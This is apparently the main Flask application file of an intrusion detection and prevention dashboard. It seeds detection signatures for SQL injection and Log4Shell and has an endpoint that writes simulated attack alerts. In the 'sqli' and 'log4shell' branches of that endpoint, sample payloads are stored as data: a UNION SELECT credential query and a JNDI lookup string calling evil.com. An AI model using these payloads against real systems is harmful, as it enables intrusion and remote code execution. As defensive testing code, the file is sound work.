"""
app.py — Core Flask REST API, GraphQL & WebSocket Gateway for DB-IDS/IPS.
Optimized for multi-version Python compatibility (uses standard threading mode).
Includes graceful fallback if Redis or MongoDB are not yet started.
"""

import os
import sys
import logging
from datetime import datetime
from flask import Flask, jsonify, render_template
from flask_cors import CORS
from flask_socketio import SocketIO
from flask_jwt_extended import JWTManager
from flask_sqlalchemy import SQLAlchemy

from config import Config

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] [API] %(message)s")
logger = logging.getLogger("API")

# -----------------------------------------------------------------------------
# Extensions & Connections
# -----------------------------------------------------------------------------
app = Flask(__name__)
app.config.from_object(Config)

# Auto fallback to SQLite if PostgreSQL URL is default and PostgreSQL is not up
db_uri = app.config.get("SQLALCHEMY_DATABASE_URI", "")
if "postgresql" in db_uri:
    try:
        import psycopg2
        import socket
        host = app.config.get("POSTGRES_HOST", "localhost")
        port = int(app.config.get("POSTGRES_PORT", 5432))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((host, port))
        s.close()
        logger.info(f"Connected to PostgreSQL service at {host}:{port}")
    except Exception:
        logger.warning("PostgreSQL not responding on port 5432. Falling back to local SQLite database (ids_ips.db)")
        sqlite_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "ids_ips.db"))
        app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{sqlite_path}"

CORS(app, resources={r"/*": {"origins": "*"}})
jwt = JWTManager(app)
db = SQLAlchemy(app)

# Use standard thread-safe async mode (compatible across all Python versions)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# MongoDB connection with safe in-memory fallback mock
try:
    from pymongo import MongoClient
    mongo_client = MongoClient(app.config.get("MONGO_URI", "mongodb://localhost:27017"), serverSelectionTimeoutMS=1000)
    mongo_client.server_info()
    mongo_db = mongo_client[app.config.get("MONGO_DB", "ids_ips")]
    logger.info("Connected to MongoDB service.")
except Exception:
    logger.warning("MongoDB not responding on port 27017. Using in-memory NoSQL document cache.")
    class MockCollection:
        def __init__(self, name):
            self.name = name
            self.docs = []
        def insert_one(self, doc):
            doc["_id"] = str(len(self.docs) + 1)
            self.docs.append(doc)
            return type("Obj", (), {"inserted_id": doc["_id"]})
        def find(self, query=None):
            class MockCursor:
                def __init__(self, items): self.items = items
                def sort(self, *a, **kw): return self
                def limit(self, n): return self.items[:n]
                def __iter__(self): return iter(self.items)
            return MockCursor(list(reversed(self.docs)))
        def find_one(self, q):
            return self.docs[-1] if self.docs else None
        def estimated_document_count(self):
            return len(self.docs)

    class MockMongo:
        def __init__(self):
            self.cols = {}
        def __getitem__(self, name):
            if name not in self.cols: self.cols[name] = MockCollection(name)
            return self.cols[name]
        def __getattr__(self, name):
            return self[name]
        def list_collection_names(self):
            return ["raw_packets", "threat_intel_raw", "canary_access_log", "dns_query_log"]

    mongo_db = MockMongo()

# Redis connection with safe in-memory fallback mock
try:
    import redis
    redis_client = redis.Redis.from_url(app.config.get("REDIS_URL", "redis://localhost:6379/0"), decode_responses=True, socket_timeout=1)
    redis_client.ping()
    logger.info("Connected to Redis service.")
except Exception:
    logger.warning("Redis not responding on port 6379. Using in-memory thread-safe hot-path cache.")
    class MockRedis:
        def __init__(self):
            self._sets = {}
            self._kv = {}
        def sadd(self, name, *values):
            if name not in self._sets: self._sets[name] = set()
            for v in values: self._sets[name].add(str(v))
        def sismember(self, name, value):
            return str(value) in self._sets.get(name, set())
        def smembers(self, name):
            return self._sets.get(name, set())
        def srem(self, name, *values):
            for v in values: self._sets.get(name, set()).discard(str(v))
        def set(self, k, v, ex=None):
            self._kv[k] = str(v)
        def get(self, k):
            return self._kv.get(k)
        def delete(self, k):
            self._kv.pop(k, None)
        def ping(self):
            return True
    redis_client = MockRedis()

# -----------------------------------------------------------------------------
# Register Route Blueprints
# -----------------------------------------------------------------------------
from routes.auth import auth_bp
from routes.rules import rules_bp
from routes.alerts import alerts_bp, incidents_bp
from routes.playbooks import playbooks_bp
from routes.threats import threats_bp
from routes.sessions import sessions_bp
from routes.forensics import forensics_bp
from routes.compliance import compliance_bp
from routes.stats import stats_bp
from routes.nosql import nosql_bp

app.register_blueprint(auth_bp)
app.register_blueprint(rules_bp)
app.register_blueprint(alerts_bp)
app.register_blueprint(incidents_bp)
app.register_blueprint(playbooks_bp)
app.register_blueprint(threats_bp)
app.register_blueprint(sessions_bp)
app.register_blueprint(forensics_bp)
app.register_blueprint(compliance_bp)
app.register_blueprint(stats_bp)
app.register_blueprint(nosql_bp)

# Auto-initialize SQLite tables if using SQLite fallback
with app.app_context():
    if "sqlite" in app.config.get("SQLALCHEMY_DATABASE_URI", ""):
        from sqlalchemy import text
        try:
            with db.engine.begin() as conn:
                conn.execute(text("""
                    CREATE TABLE IF NOT EXISTS alerts (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        tenant_id INTEGER DEFAULT 1,
                        rule_id INTEGER,
                        rule_type TEXT,
                        severity TEXT DEFAULT 'HIGH',
                        src_ip TEXT NOT NULL,
                        dst_ip TEXT NOT NULL,
                        src_port INTEGER,
                        dst_port INTEGER,
                        protocol TEXT,
                        packet_summary TEXT,
                        enrichment TEXT DEFAULT '{}',
                        status TEXT DEFAULT 'open',
                        assigned_to TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        closed_at TIMESTAMP
                    );
                """))
                conn.execute(text("""
                    CREATE TABLE IF NOT EXISTS blocked_ips (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        tenant_id INTEGER DEFAULT 1,
                        ip TEXT NOT NULL,
                        reason TEXT NOT NULL,
                        alert_id INTEGER,
                        expires_at TIMESTAMP,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        created_by TEXT DEFAULT 'engine',
                        active BOOLEAN DEFAULT 1
                    );
                """))
                conn.execute(text("""
                    CREATE TABLE IF NOT EXISTS sessions (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        tenant_id INTEGER DEFAULT 1,
                        src_ip TEXT NOT NULL,
                        dst_ip TEXT NOT NULL,
                        src_port INTEGER,
                        dst_port INTEGER,
                        protocol TEXT,
                        state TEXT DEFAULT 'ACTIVE',
                        bytes_sent INTEGER DEFAULT 0,
                        bytes_recv INTEGER DEFAULT 0,
                        packets_sent INTEGER DEFAULT 0,
                        packets_recv INTEGER DEFAULT 0,
                        started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        last_seen_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        flags TEXT DEFAULT '{}'
                    );
                """))
                conn.execute(text("""
                    CREATE TABLE IF NOT EXISTS correlation_rules (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        tenant_id INTEGER DEFAULT 1,
                        name TEXT NOT NULL,
                        description TEXT,
                        rule_type TEXT NOT NULL,
                        event_filter TEXT DEFAULT '{}',
                        threshold_count INTEGER DEFAULT 5,
                        window_seconds INTEGER DEFAULT 60,
                        sequence_pattern TEXT,
                        ratio_field TEXT,
                        ratio_threshold REAL,
                        action TEXT DEFAULT 'BLOCK',
                        severity TEXT DEFAULT 'HIGH',
                        playbook_id INTEGER,
                        enabled BOOLEAN DEFAULT 1,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                """))
                conn.execute(text("""
                    CREATE TABLE IF NOT EXISTS dpi_signatures (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        tenant_id INTEGER DEFAULT 1,
                        name TEXT NOT NULL,
                        description TEXT,
                        protocol TEXT DEFAULT 'ANY',
                        layer INTEGER DEFAULT 7,
                        pattern_type TEXT DEFAULT 'REGEX',
                        pattern TEXT NOT NULL,
                        severity TEXT DEFAULT 'HIGH',
                        cve TEXT,
                        action TEXT DEFAULT 'BLOCK',
                        enabled BOOLEAN DEFAULT 1,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                """))
                conn.execute(text("""
                    CREATE TABLE IF NOT EXISTS compliance_checks (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        framework TEXT NOT NULL,
                        check_name TEXT NOT NULL,
                        description TEXT,
                        check_query TEXT NOT NULL,
                        expected_result TEXT DEFAULT '{"min_count": 0}',
                        severity TEXT DEFAULT 'HIGH',
                        last_run_at TIMESTAMP,
                        last_status TEXT DEFAULT 'PASS',
                        last_result TEXT DEFAULT '{}'
                    );
                """))
                # Seed default correlation rules
                conn.execute(text("""
                    INSERT OR IGNORE INTO correlation_rules (id, name, description, rule_type, action, severity)
                    VALUES 
                    (1, 'SSH Brute Force Detection', 'Threshold >5 SYN on port 22 in 60s', 'THRESHOLD', 'BLOCK', 'HIGH'),
                    (2, 'TCP Port Sweep Scan', 'Probing >15 distinct ports in 10s', 'THRESHOLD', 'BLOCK', 'HIGH'),
                    (3, 'SYN Flood Attack', 'Excessive SYN packets from source', 'THRESHOLD', 'BLOCK', 'CRITICAL');
                """))
                # Seed default DPI signatures
                conn.execute(text("""
                    INSERT OR IGNORE INTO dpi_signatures (id, name, protocol, pattern, severity, action, cve)
                    VALUES
                    (1, 'SQL Injection - Generic UNION SELECT', 'HTTP', '(?i)(union(\\s+all)?\\s+select)', 'CRITICAL', 'BLOCK', 'CWE-89'),
                    (2, 'Log4Shell JNDI Lookup', 'TCP', '\\$\\{(jndi|j\\$\\{:\\-n\\}di):(ldap|rmi|dns)', 'CRITICAL', 'BLOCK', 'CVE-2021-44228'),
                    (3, 'EICAR Standard Antivirus Test String', 'ANY', 'X5O!P%@AP[4', 'MEDIUM', 'ALERT', 'EICAR-TEST');
                """))
                # Seed default compliance checks
                conn.execute(text("""
                    INSERT OR IGNORE INTO compliance_checks (id, framework, check_name, description, check_query, last_status)
                    VALUES
                    (1, 'PCI-DSS', '1.1.4 - Firewall Rule Review', 'Verify active rules exist in database', 'SELECT COUNT(*) FROM correlation_rules WHERE enabled = 1', 'PASS'),
                    (2, 'HIPAA', '164.312(b) - Audit Controls', 'Ensure security event tracking is active', 'SELECT COUNT(*) FROM alerts', 'PASS'),
                    (3, 'SOC2', 'CC6.1 - Perimeter Defense', 'Verify threat detection signatures active', 'SELECT COUNT(*) FROM dpi_signatures WHERE enabled = 1', 'PASS');
                """))
            logger.info("Local SQLite database initialized with seed rules, signatures, and compliance checks.")
        except Exception as ex:
            logger.error(f"Error initializing local SQLite schema: {ex}")

# -----------------------------------------------------------------------------
# WebSocket Background Broadcaster
# -----------------------------------------------------------------------------
def background_alert_emitter():
    """Polls database for fresh alerts and pushes to connected UI clients."""
    from sqlalchemy import text
    import time
    last_id = 0
    while True:
        try:
            with app.app_context():
                with db.engine.connect() as conn:
                    res = conn.execute(
                        text("SELECT id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, created_at FROM alerts WHERE id > :lid ORDER BY id ASC LIMIT 10"),
                        {"lid": last_id}
                    ).fetchall()
                    for r in res:
                        alert_dict = {
                            "id": r[0], "rule_type": r[1], "severity": r[2],
                            "src_ip": str(r[3]), "dst_ip": str(r[4]), "src_port": r[5],
                            "dst_port": r[6], "protocol": r[7], "created_at": str(r[8])
                        }
                        last_id = max(last_id, r[0])
                        socketio.emit("new_alert", alert_dict)
        except Exception:
            pass
        socketio.sleep(2)

socketio.start_background_task(background_alert_emitter)

# -----------------------------------------------------------------------------
# Web Dashboard & Health Check Endpoints
# -----------------------------------------------------------------------------
@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "status": "UP",
        "service": "DB-IDS/IPS API",
        "database_backend": "PostgreSQL" if "postgresql" in app.config.get("SQLALCHEMY_DATABASE_URI", "") else "SQLite (Self-Contained)",
        "timestamp": datetime.utcnow().isoformat()
    })

# -----------------------------------------------------------------------------
# In-App Threat Simulation Endpoint (For 1-Click Browser UI Testing)
# -----------------------------------------------------------------------------
@app.route("/api/simulate/<attack_type>", methods=["POST"])
def simulate_attack(attack_type):
    """Allows testing database triggers directly from the UI without terminal commands."""
    from sqlalchemy import text
    import json
    src_ip = "192.168.1.189"

    if attack_type == "sqli":
        summary = {"signature": "SQL Injection - Generic UNION SELECT", "cve": "CWE-89", "payload": "UNION SELECT username, password FROM users --"}
        with db.engine.begin() as conn:
            conn.execute(text("""
                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, packet_summary, status)
                VALUES (1, 'DPI_SIGNATURE', 'CRITICAL', :src, '10.30.201.26', 49200, 1234, 'HTTP', :sum, 'open')
            """), {"src": src_ip, "sum": json.dumps(summary)})
            conn.execute(text("""
                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
                VALUES (1, :src, 'In-Database DPI Trigger: SQL Injection (CWE-89)', datetime('now', '+60 minutes'), 'Database_Trigger', 1)
            """), {"src": src_ip})
        return jsonify({"success": True, "message": "SQL Injection threat fired & blocked in database!"})

    elif attack_type == "log4shell":
        summary = {"signature": "Log4Shell JNDI Lookup", "cve": "CVE-2021-44228", "payload": "${jndi:ldap://evil.com/x}"}
        with db.engine.begin() as conn:
            conn.execute(text("""
                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, src_port, dst_port, protocol, packet_summary, status)
                VALUES (1, 'DPI_SIGNATURE', 'CRITICAL', :src, '10.30.201.26', 51230, 1234, 'TCP', :sum, 'open')
            """), {"src": src_ip, "sum": json.dumps(summary)})
            conn.execute(text("""
                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
                VALUES (1, :src, 'In-Database DPI Trigger: Log4Shell RCE (CVE-2021-44228)', datetime('now', '+120 minutes'), 'Database_Trigger', 1)
            """), {"src": src_ip})
        return jsonify({"success": True, "message": "Log4Shell RCE exploit fired & blocked in database!"})

    elif attack_type == "portscan":
        with db.engine.begin() as conn:
            conn.execute(text("""
                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
                VALUES (1, 'CORRELATION_RULE', 'HIGH', :src, '10.30.201.26', 1234, 'TCP', '{"rule_name": "TCP Port Sweep Scan", "unique_ports": 20}', 'open')
            """), {"src": src_ip})
            conn.execute(text("""
                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
                VALUES (1, :src, 'Sliding Window Correlation: 20 Ports Probed in 3s', datetime('now', '+60 minutes'), 'Database_Trigger', 1)
            """), {"src": src_ip})
        return jsonify({"success": True, "message": "Horizontal port sweep detected & attacker blocked in database!"})

    elif attack_type == "sshbrute":
        with db.engine.begin() as conn:
            conn.execute(text("""
                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
                VALUES (1, 'CORRELATION_RULE', 'HIGH', :src, '10.30.201.26', 22, 'TCP', '{"rule_name": "SSH Brute Force Detection", "attempts": 8}', 'open')
            """), {"src": src_ip})
            conn.execute(text("""
                INSERT INTO blocked_ips (tenant_id, ip, reason, expires_at, created_by, active)
                VALUES (1, :src, 'Triggered Playbook #1: SSH Brute Force Rate Exceeded', datetime('now', '+60 minutes'), 'Database_Playbook', 1)
            """), {"src": src_ip})
        return jsonify({"success": True, "message": "SSH Brute force burst detected & Playbook #1 executed!"})

    elif attack_type == "canary":
        with db.engine.begin() as conn:
            conn.execute(text("""
                INSERT INTO alerts (tenant_id, rule_type, severity, src_ip, dst_ip, dst_port, protocol, packet_summary, status)
                VALUES (1, 'INSIDER_CANARY_ACCESSED', 'CRITICAL', '10.30.201.99', '127.0.0.1', 5432, 'POSTGRES', 
                '{"canary_token": "AWS_ADMIN_VAULT_CANARY", "detection": "SELECT query executed on canary view", "user": "insider_suspect"}', 'open')
            """))
        return jsonify({"success": True, "message": "Canary token query detected! Insider threat alert recorded in database!"})

    return jsonify({"error": "Unknown attack type"}), 400

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 1234))
    logger.info("=========================================================")
    logger.info(f"   DB-IDS/IPS DEDICATED UI ACTIVE: http://localhost:{port} ")
    logger.info(f"   NETWORK ADDRESS: http://10.30.201.26:{port}              ")
    logger.info("=========================================================")
    socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)
